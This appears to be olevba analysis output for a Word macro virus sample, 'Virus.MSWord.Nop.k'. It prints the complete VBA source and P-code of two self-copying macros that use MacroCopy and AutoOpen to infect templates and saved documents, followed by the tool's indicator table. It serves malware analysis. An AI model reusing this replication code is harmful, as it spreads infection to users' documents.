olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nop.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nop.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Nop.k - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Who$
Rem /////////////////////////////////
Rem /Made in Jakutsk by me          /
Rem /That's engoy to prove my power /
Rem /Say by to you files            /
Rem /              :)               /
Rem /////////////////////////////////
On Error GoTo -1: On Error GoTo lll
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
Who$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
WordBasic.MacroCopy "FileSaveAs", Who$ + ":CopySaveAs"
WordBasic.MacroCopy "CopyOpen", Who$ + ":AutoOpen"
WordBasic.FileSaveAs dlg
lll:
End Sub
-------------------------------------------------------------------------------
VBA MACRO CopyOpen.bas 
in file: Virus.MSWord.Nop.k - OLE stream: 'Macros/VBA/CopyOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Who$
Rem /////////////////////////////////
Rem /Made in Jakutsk by me          /
Rem /That's engoy to prove my power /
Rem /Say by to you files            /
Rem /              :)               /
Rem /////////////////////////////////
Who$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
WordBasic.MacroCopy Who$ + ":CopySaveAs", "FileSaveAs"
WordBasic.MacroCopy Who$ + ":AutoOpen", "CopyOpen"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Nop.k
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FileSaveAs - 1962 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Who
' Line #3:
' 	Rem 0x0022 " /////////////////////////////////"
' Line #4:
' 	Rem 0x0022 " /Made in Jakutsk by me          /"
' Line #5:
' 	Rem 0x0022 " /That's engoy to prove my power /"
' Line #6:
' 	Rem 0x0022 " /Say by to you files            /"
' Line #7:
' 	Rem 0x0022 " /              :)               /"
' Line #8:
' 	Rem 0x0022 " /////////////////////////////////"
' Line #9:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError lll 
' Line #10:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #12:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #13:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameInfo$] 0x0002 
' 	St Who$ 
' Line #15:
' 	LitStr 0x000A "FileSaveAs"
' 	Ld Who$ 
' 	LitStr 0x000B ":CopySaveAs"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	LitStr 0x0008 "CopyOpen"
' 	Ld Who$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #18:
' 	Label lll 
' Line #19:
' 	EndSub 
' Macros/VBA/CopyOpen - 1557 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Who
' Line #3:
' 	Rem 0x0022 " /////////////////////////////////"
' Line #4:
' 	Rem 0x0022 " /Made in Jakutsk by me          /"
' Line #5:
' 	Rem 0x0022 " /That's engoy to prove my power /"
' Line #6:
' 	Rem 0x0022 " /Say by to you files            /"
' Line #7:
' 	Rem 0x0022 " /              :)               /"
' Line #8:
' 	Rem 0x0022 " /////////////////////////////////"
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameInfo$] 0x0002 
' 	St Who$ 
' Line #10:
' 	Ld Who$ 
' 	LitStr 0x000B ":CopySaveAs"
' 	Add 
' 	LitStr 0x000A "FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	Ld Who$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0008 "CopyOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

